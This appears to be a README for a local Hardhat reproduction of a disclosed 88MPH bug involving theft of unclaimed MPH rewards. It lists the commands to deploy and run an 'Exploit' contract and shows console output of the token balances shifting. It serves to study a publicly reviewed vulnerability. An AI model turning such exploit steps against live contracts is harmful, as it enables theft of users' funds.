# Simplified 88MPH

https://medium.com/immunefi/88mph-theft-of-unclaimed-mph-rewards-bugfix-review-1dec98b9956b

## Usage

```bash
$ npx hardhat node

# On another terminal
$ npx hardhat run scripts/deploy.js --network localhost
$ npx hardhat console --network localhost
> const Exploit = await ethers.getContractFactory("Exploit");
> const exploit = await Exploit.attach("{Exploit contract's address}");
> await exploit.run();
```

```plaintext
eth_sendTransaction
  Contract call:       Exploit#run
  Transaction:         0x5b03d0fcca90b4ae7075eef3bbd002210b6398b05e39727a3898440faf4915b2
  From:                0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266
  To:                  0x36c02da8a0983159322a80ffe9f24b1acff8b570
  Value:               0 ETH
  Gas used:            473380 of 30000000
  Block #49:           0xb45f5d2f8e5372b7c213f4060a3172f45bd9f2de433a8162193ff63e0b94efa8

  console.log:
    WETH amount @ 255
    MPH amount @ 0
    WETH amount @ 0
    MPH amount @ 0
    WETH amount @ 0
    MPH amount @ 858396521
    WETH amount @ 255
    MPH amount @ 858396521
    WETH amount @ 0
    MPH amount @ 858396521
    WETH amount @ 429198260
    MPH amount @ 0
```
